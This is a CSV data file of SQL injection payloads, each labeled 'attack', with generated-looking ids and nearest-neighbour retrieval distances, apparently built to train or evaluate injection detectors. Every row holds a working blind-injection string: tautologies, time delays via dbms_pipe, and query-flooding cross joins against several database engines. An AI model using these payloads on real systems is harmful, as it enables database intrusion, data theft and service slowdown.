id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000414,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",nearest_attack_euclidean,R000100,6.672394266458805
CTGAN_000415,attack,boolean,"1%'   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000470,6.050806787266793
CTGAN_000416,attack,boolean,1   )    )    and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and    (    (   6406  =  6406,nearest_attack_euclidean,R000058,6.223721240527671
CTGAN_000417,attack,boolean,"-1863'  )   or make_set  (  9354  =  9354,7185  )   and   (  'whwv'  =  'whwv",nearest_attack_euclidean,R000418,4.501667269099166
CTGAN_000418,attack,boolean,1   )    )     )   rlike   (  select   (  case when   (  4367  =  6879  )   then 1 else 0x28 end   )    )    and    (    (     (  2542  =  2542,nearest_attack_euclidean,R000120,6.680028721168871
CTGAN_000419,attack,boolean,-5995'   )    )    or 6872  =  6872 and    (    (   'pywh'  =  'pywh,nearest_attack_euclidean,R000338,6.4414915278814515
CTGAN_000420,attack,boolean,"1%'  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000617,7.17305464120138
CTGAN_000421,attack,boolean,"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",nearest_attack_euclidean,R000313,5.9500645076293806
CTGAN_000422,attack,boolean,-7773' or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  ) ,nearest_attack_euclidean,R000775,6.499102335738575
CTGAN_000423,attack,boolean,"-4327"" or make_set  (  3107  =  1781,1781  )   and ""lclf"" like ""lclf",nearest_attack_euclidean,R000441,4.832516975686209
CTGAN_000424,attack,boolean,"1""   )    )    or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and    (    (   ""ubxw"" like ""ubxw",nearest_attack_euclidean,R000247,4.450663213735731
CTGAN_000425,attack,boolean," select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",nearest_attack_euclidean,R000009,5.703673182918148
CTGAN_000426,attack,boolean,"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lazm"" like ""lazm",nearest_attack_euclidean,R000154,6.780688104169889
CTGAN_000427,attack,boolean,"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",nearest_attack_euclidean,R000302,6.303465135169802
CTGAN_000428,attack,boolean,"-1583'  )   or elt  (  1032  =  1032,3623  )   and   (  'jrcj' like 'jrcj",nearest_attack_euclidean,R000450,5.594306405455457
CTGAN_000429,attack,boolean,"1""   )    )     )   and make_set  (  8403  =  8403,8899  )   and    (    (     (  ""czvm"" like ""czvm",nearest_attack_euclidean,R000207,4.197955172647285
CTGAN_000430,attack,boolean,"-1305  )   or make_set  (  2298  =  5545,5545  )   and   (  6715  =  6715",nearest_attack_euclidean,R000214,6.278498485632481
CTGAN_000431,attack,boolean,"1""   )    )    and 7533  =  7533 and    (    (   ""rnni"" like ""rnni",nearest_attack_euclidean,R000113,5.3984077793870275
CTGAN_000432,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000267,6.663608364955551
CTGAN_000433,attack,boolean,"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and 'bwrb' like 'bwrb",nearest_attack_euclidean,R000693,5.120278656075125
CTGAN_000434,attack,boolean,1'||  (  select 'xdzp' from dual where 5786  =  5786 and   (  3020  =  3020  )  *6703  )  ||',nearest_attack_euclidean,R000254,6.317840820687062
CTGAN_000435,attack,boolean,"1"" and 1668  =  8288",nearest_attack_euclidean,R000151,6.622442387689215
CTGAN_000436,attack,boolean,"-5174'   )    )     )   or make_set  (  9515  =  7938,7938  )   and    (    (     (  'ygee'  =  'ygee",nearest_attack_euclidean,R000283,7.345879395528016
CTGAN_000437,attack,boolean,"1'  )   where 8348  =  8348 and elt  (  4249  =  4249,7259  )  --",nearest_attack_euclidean,R000627,6.591960103533453
CTGAN_000438,attack,boolean,"1""   )    )    or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000333,4.566698721173395
CTGAN_000439,attack,boolean,"1 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  # jcdh",nearest_attack_euclidean,R000744,7.130775123433585
CTGAN_000440,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""%""  =  """,nearest_attack_euclidean,R000416,5.013867102532229
CTGAN_000441,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000131,6.259469005494135
CTGAN_000442,attack,boolean,"1'  )   and elt  (  5245  =  9203,9203  )   and   (  'fhlw' like 'fhlw",nearest_attack_euclidean,R000566,4.380305198497327
CTGAN_000443,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000131,5.611300196789102
CTGAN_000444,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000393,7.092152428126318
CTGAN_000445,attack,boolean,"1   )    )    as uizx where 2512  =  2512 and make_set  (  1402  =  2908,2908  )  --",nearest_attack_euclidean,R000190,5.228135380390895
CTGAN_000446,attack,boolean,"1 where 6077  =  6077 or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000269,7.690539793416193
CTGAN_000447,attack,boolean,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ygfv'  =  'ygfv",nearest_attack_euclidean,R000231,5.528168737575848
CTGAN_000448,attack,boolean,"-5630""  )   or 3038  =  3038",nearest_attack_euclidean,R000466,5.362695849617542
CTGAN_000449,attack,boolean,"1 and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  # cgow",nearest_attack_euclidean,R000778,5.1106096981946845
CTGAN_000450,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000393,5.727460474769375
CTGAN_000451,attack,boolean,"1   )    )     )   or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  1164  =  1164",nearest_attack_euclidean,R000369,6.288385164148685
CTGAN_000452,attack,boolean,"1%""  )   and make_set  (  9956  =  1060,1060  )   and   (  ""%""  =  """,nearest_attack_euclidean,R000400,5.4098772150026875
CTGAN_000453,attack,boolean,"1   )    )    as uizx where 2512  =  2512 and make_set  (  1402  =  2908,2908  )  --",nearest_attack_euclidean,R000190,3.1320060598436785
CTGAN_000454,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000649,6.063932151979757
CTGAN_000455,attack,boolean,"1   )    )    as krzi where 8727  =  8727 or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000616,3.3948445527485474
CTGAN_000456,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000131,4.298102021946891
CTGAN_000457,attack,boolean,"1""   )    )    as ngvf where 9912  =  9912 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000588,7.022215603085596
CTGAN_000458,attack,boolean,"1'  )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and   (  'cysu' like 'cysu",nearest_attack_euclidean,R000351,6.709738168094712
CTGAN_000459,attack,boolean,"1""   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  ""jzsb""  =  ""jzsb",nearest_attack_euclidean,R000100,6.293846379395742
CTGAN_000460,attack,boolean,"1'   )    )     )   or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (     (  'qvqf'  =  'qvqf",nearest_attack_euclidean,R000142,7.445479573234115
CTGAN_000461,attack,boolean,"1""  )   where 4660  =  4660 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000268,6.975498700437135
CTGAN_000462,attack,boolean,"1'   )    )     )   and make_set  (  7539  =  3946,3946  )   and    (    (     (  'qbpo'  =  'qbpo",nearest_attack_euclidean,R000401,5.134060402484591
CTGAN_000463,attack,boolean,"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000272,4.778759496578125
CTGAN_000464,attack,boolean,"1   )    )     )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000246,6.687589750225626
CTGAN_000465,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000198,5.726746454798707
CTGAN_000466,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000131,5.040203772471402
CTGAN_000467,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8503  =  8503",nearest_attack_euclidean,R000232,5.462102901153781
CTGAN_000468,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000251,6.211062541703166
CTGAN_000469,attack,boolean,"1' in boolean mode  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000150,7.633661825158784
CTGAN_000470,attack,boolean,"1"" or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000131,5.901363900489422
CTGAN_000471,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000077,6.0548946742746494
CTGAN_000472,attack,boolean,"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and ""cdai""  =  ""cdai",nearest_attack_euclidean,R000729,5.861502247497798
CTGAN_000473,attack,boolean,"1""   )    )    as uels where 9447  =  9447 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",nearest_attack_euclidean,R000630,4.833016396200803
CTGAN_000474,attack,boolean,"1%"" and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and ""%""  =  """,nearest_attack_euclidean,R000424,6.211883521456234
CTGAN_000475,attack,boolean,"-1055"" or   (  8459  =  8459  )  *4906 and ""kdbr""  =  ""kdbr",nearest_attack_euclidean,R000123,5.2142997048629995
CTGAN_000476,attack,boolean,"1'||  (  select 'vekn' from dual where 4929  =  4929 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5   )    )   ||'",nearest_attack_euclidean,R000137,6.817837459479789
CTGAN_000477,attack,boolean,"1   )    )    and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R000272,5.393472756982771
CTGAN_000478,attack,boolean,"1""  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and   (  ""kxws"" like ""kxws",nearest_attack_euclidean,R000619,5.824709351832322
CTGAN_000479,attack,boolean,"1  )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  5468  =  5468",nearest_attack_euclidean,R000107,4.417479190795868
CTGAN_000480,attack,boolean,"1   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   5507  =  5507",nearest_attack_euclidean,R000580,7.2128578763896645
CTGAN_000481,attack,boolean,"1"" and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and ""hvwv""  =  ""hvwv",nearest_attack_euclidean,R000448,5.880818799506806
CTGAN_000482,attack,boolean,"1""   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000304,4.839234480012214
CTGAN_000483,attack,boolean,"1'||  (  select 'lstx' from dual where 2972  =  2972 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7   )    )   ||'",nearest_attack_euclidean,R000490,5.834986925070898
CTGAN_000484,attack,boolean,"1%""   )    )     )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R000413,5.410126310413534
CTGAN_000485,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   '%'  =  '",nearest_attack_euclidean,R000599,5.000806273709696
CTGAN_000486,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000198,5.893957440190483
CTGAN_000487,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (     (  'squj'  =  'squj",nearest_attack_euclidean,R000638,4.769329110788518
CTGAN_000488,attack,boolean,"1'  )   and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000478,6.510704564063748
CTGAN_000489,attack,boolean,"-3472' or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  ",nearest_attack_euclidean,R000491,7.817494871326865
CTGAN_000490,attack,boolean,"1'  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",nearest_attack_euclidean,R000649,5.489682047408465
CTGAN_000491,attack,boolean,"1'   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  'nqam'  =  'nqam",nearest_attack_euclidean,R000513,6.319452583854664
CTGAN_000492,attack,boolean,"-6123"" or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and ""zuzx""  =  ""zuzx",nearest_attack_euclidean,R000267,6.412560120624695
CTGAN_000493,attack,boolean,"-4615'   )    )     )   or elt  (  1032  =  1032,3623  )   and    (    (     (  'jipk' like 'jipk",nearest_attack_euclidean,R000740,5.198008140026849
CTGAN_000494,attack,boolean,"1' where 9003  =  9003 and make_set  (  5868  =  8316,8316  )  --",nearest_attack_euclidean,R000258,5.458982621751027
CTGAN_000495,attack,boolean,"1   )    )    or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and    (    (   5336  =  5336",nearest_attack_euclidean,R000574,6.160320560733991
CTGAN_000496,attack,boolean,-2303'   )    )    as exyt where 2528  =  2528 or 8571  =  8571--,nearest_attack_euclidean,R000454,6.197611924655595
CTGAN_000497,attack,boolean,"-2583""  )   where 3455  =  3455 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000456,5.948027893737605
CTGAN_000498,attack,boolean,-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,nearest_attack_euclidean,R000277,6.982796208783817
CTGAN_000499,attack,boolean,"1"" or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and ""vwep"" like ""vwep",nearest_attack_euclidean,R000292,6.861684181655896
CTGAN_000500,attack,boolean,"1%' or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R000672,6.843446689367657
